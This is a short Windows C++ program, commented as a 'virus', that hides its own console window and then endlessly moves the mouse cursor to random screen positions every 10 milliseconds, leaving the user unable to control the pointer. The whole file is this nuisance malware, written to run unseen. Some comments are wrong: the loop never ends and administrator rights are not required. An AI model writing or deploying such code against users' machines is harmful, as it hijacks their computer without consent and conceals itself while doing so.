#include<Windows.h>//Including the Windows library
int scrwid,scrht,a,b;
void getscrdim()//Function to get screen dimensions of device
{
  scrwid=GetSystemMetrics(SM_CXSCREEN);//Stores width of screen
  scrht=GetSystemMetrics(SM_CYSCREEN);//Stores height of screen
}
void randommousepos()//Function to set mouse pointer at random positions
{
  a=rand()%scrwid;//Random value of mouse position(width) which is within screen width
  b=rand()%scrht;//Random value of mouse position(height) which is within screen height
  SetCursorPos(a,b);//Sets cursor in random positions with values of dimensions a and b
}
int main()
{
  FreeConsole();//Does not show the terminal screen
  getscrdim();
  while(true)//Will go on until Sleep value not exceeded
  {
    randommousepos();
    Sleep(10);//Virus will remain active for 10 ms
  }
}//Program can be run only after allowing "Run as administrator"
